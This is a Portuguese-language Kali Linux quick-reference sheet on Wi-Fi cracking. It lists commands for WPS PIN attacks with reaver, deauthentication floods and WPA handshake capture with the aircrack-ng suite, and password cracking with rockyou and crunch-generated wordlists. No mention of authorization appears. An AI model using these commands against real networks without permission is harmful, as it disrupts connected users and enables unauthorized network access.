# **KALI LINUX**
<div>
<img src="https://seeklogo.com/images/K/kali-linux-logo-5A3B1D1555-seeklogo.com.png" alt="logoJS" width="50px"/> 
</div>

*Autor: Walysson dos Reis*

----------------------------------------------
*Manual de consulta rápida dos conceitos e principais comandos.*  

---------------------
## Wifi Cracking 
### WPS Cracking com Reaver
* `airmon-ng check kill` - Interrompe processos que estejam utilizando a interface wifi.
* `airmon-ng start wlan0` - Coloca a interface wlan0 em modo de monitoramento.
* `wash -i wlan0mon` - Ativa a descoberta WPS de redes disponiveis na interface wlan0mon.
* `reaver -i wlan0mon -c 1 -b 00:00:00:00:00:00 -vv` - Inicia o ataque Reaver.
* `reaver -i wlan0mon -c 1 -b 00:00:00:00:00:00  -vv -L -N -d 15 -T .5 -r 3:15` - Inicia o ataque Reaver com parâmetros de intervalos opcionais.

### Hacking Wifi WPA-PSK com Aircrack
* `airmon-ng check kill` - Interrompe processos que estejam utilizando a interface wifi.
* `airmon-ng start wlan0` - Coloca a interface wlan0 em modo de monitoramento.
* `airodump-ng wlan0mon` - Ativa a descoberta de redes disponiveis na interface wlan0mon.
* `wash -i wlan0mon` - Ativa a descoberta WPS de redes disponiveis na interface wlan0mon.
* `airodump-ng --bssid 00:00:00:00:00:00 -c 1 --write ArqCAP wlan0mon` - Inicia o modo de captura de pacotes do equipamento de rede alvo.
* `aireplay-ng --deauth 100 -a 00:00:00:00:00:00 wlan0mon` - Executado em terminal paralelo, força a desconexão dos dispositivos da rede alvo.
* Havendo sucesso na captura do pacote de autenticação, no terminal que executa o monitoramento aparecerá a seguinte mensagem: 'WPA handshake'.
* Em posse do pacote capturado com a senha criptografada, devemos quebrar a senha utilizando Wordlists.
* /usr/share/wordlists/rockyou.txt.gz - Wordlist padrão do Kali Linux.
* `gzip -d rockyou.txt.gz` - Descompacta o arquivo rockyou.txt.gz deletando o arquivo zipado.
* `aircrack-ng ArqCap-01.cap -w rockyou.txt` - Inicia o processo de teste de senha utilizando o arquivo de wordlist especificado.
* `grep -E '^.{8,63}$' < rockyou.txt >> rockyou_wpa_passwd.txt` -  Filtra o arquivo rockyou.txt gerando um novo arquivo que contenha apenas senhas no padrão WPA/WPA2 (8-63 caracteres).

#### Crunch : Gerador de Wordlist
* `crunch <min> <max> [opções] ` - Uso padrão do Crunch.
*  lowUP123@%# (Minúsculas,maiúsculas,números e símbolos) - Ordem de Charset no Crunch.
* Parâmetros do Crunch:
    * -b : Tamanho máximo da lista de palavras (requer -o START).
    * -c : Número de linhas para escrever na lista de palavras (requer -o START).
    * -d : Limita o número de caracteres duplicados.
    * -e : Interrompe a geração de palavras em uma determinado string.
    * -f : Especifica uma lista de conjuntos de caracteres do arquivo charset.lst.
    * -i : Inverte a ordem dos caracteres na lista de palavras.
    * -l : Permite a interpretação literal de @,% ^ ao usar -t.
    * -o : O arquivo de lista de saída.
    * -p : Imprime permutações sem repetir caracteres (não pode ser usado com -s).
    * -q : Como a opção -p, exceto a leitura das sequências de um arquivo especificado.
    * -r : Retoma uma sessão anterior (não pode ser usada com -s).
    * -s : Especifique uma string para iniciar a lista de palavras.
    * -t : Define um padrão específico de @,% ^.
    * -z : Comprime o arquivo da lista de saída, acompanhado de -o.
 * Refêrencia do Crunch:
    * @ : Representa letras minúsculas.
    * , : Representa letras maiúsculas.
    * % : Representa números.
    * ^ : Representa caracteres especiais.
 * Lista Charset: /usr/share/crunch/charset.lst:
    * Conjunto de caracteres disponíveis no arquivo charset.lst:
      * lalpha : Letras minúsculas.
      * ualpha : Letras maiúsculas.
      * lalpha-numeric : Letras minúsculas e números.
      * ualpha-numeric : Letras maiúsculas e números.
      * lalpha-numeric-all-space : Letras minúsculas, números e caracteres especiais.
      * ualpha-numeric-all-space : Letras maiúsculas, números e caracteres especiais.
      * mixalpha : Letras minúsculas e maiúsculas.
      * mixalpha-numeric-all-space : Letras maiúsculas, minúsculas, números, caracteres especiais e espaço. 

* `crunch 4 6 1234567890 -o MinhaWordlist01.txt` - Exemplo: Gera lista numérica com palavras de 4 a 6 caracteres e armazena resultado. 
* `crunch 9 9 1234567890 -t palavra@@@@ -o MinhaWordlist02.txt` - Exemplo: Gera lista com parte da palavra fixa de 9 caracteres e variação numérica, armazenando resultado.
* `crunch 4 8 -f charset.lst mixalpha -o MinhaWordlist03.txt` - Exemplo: Gera lista com palavras de 4 a 8 caracteres utilizando charset de letras minusculas e maiusculas e armazena resultado.
* `crunch 8 8 -f charset.lst mixalpha-numeric-all-space -t @@abc@@@ -o MinhaWordlist04.txt` - Exemplo: Gera lista com palavra de tamanho 8 combinando variáveis charset e palavras fixas armazenando resultado. 
* `crunch 4 4 -f charset.lst mixalpha-numeric-all-space -o MinhaWordlist05.txt` - Exemplo: Gera lista com palavra de tamanho 4 utilizando todos os caracteres possíveis do charset e armazena resultado.
* `crunch 8 8 abcdefghijklmnopqrstuvxz 1234567890 | aircrack --bssid 00:00:00:00:00:00 -w- ArqCap-01.cap` - Exemplo: Gera lista com palavra de tamanho 8 que contenha letras letras e números especificados passando diretamente para o software aircrack; não armazena resultado. 
* `crunch 8 8 | john --stdin --session=session1 --stdout | aircrack-ng -b 00:00:00:00:00:00 -w- ArqCap-01.cap` - Exemplo: Gera lista com palavras de tamanho 8 apenas com o padrão letras minúsculas do alfabeto passando diretamente para o software aircrack; Diferencial utiliza o software john para guardar o progresso de execução.
* `crunch 8 8 | john --restore=session1 | aircrack-ng -b 00:00:00:00:00:00 -w- ArqCap-01.cap` - Exemplo: Restaura execução da geração de lista passada diretamente para o software aircrack.
--------
## Referências
https://outpost24.com/blog/wps-cracking-with-reaver  
https://cienciacomputacao.com.br/tutorial/como-hackear-wi-fi-wpa2-psk-com-kali-linux/  
https://www.cyberpratibha.com/blog/how-do-i-use-rockyou-wordlist-txt-in-kali-linux/  
https://deadpackets.wordpress.com/2012/11/11/wireless-fun-crackeando-wpawpa2/  
https://nsworld.com.br/crunch-gerador-de-wordlist/  
https://nsworld.com.br/aircrack-ng-pacote-de-ferramentas-para-monitorizar-e-analisar-redes-sem-fio/  
https://nsworld.com.br/cracking-wpa-com-aircrack-ng/  
https://www.thinklinux.com.br/?p=130  
https://cibersegurancawernik.blogspot.com/2018/01/capturando-pacotes-wifi-aircrack-e.html  



